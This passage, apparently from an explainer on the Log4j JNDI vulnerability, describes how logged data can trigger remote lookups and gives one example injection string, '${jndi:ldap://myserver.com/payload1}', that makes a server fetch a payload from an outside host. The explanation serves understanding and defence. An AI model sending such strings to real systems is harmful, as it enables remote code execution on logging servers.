
But with carefully crafted data to be logged, JNDI will attempt to retrieve the variable with whatever service is presented in the log entry, for example: ${jndi:ldap://myserver.com/payload1}
This log format will make JNDI retrieve the contents of payload1 from myserver.com.
This can obviously be abused to provide malicious content to compromise the logging server.
But how does the attacker get this string over to Log4j in the first place?
The attacker has to know what is being logged by the application listening over the attacked port.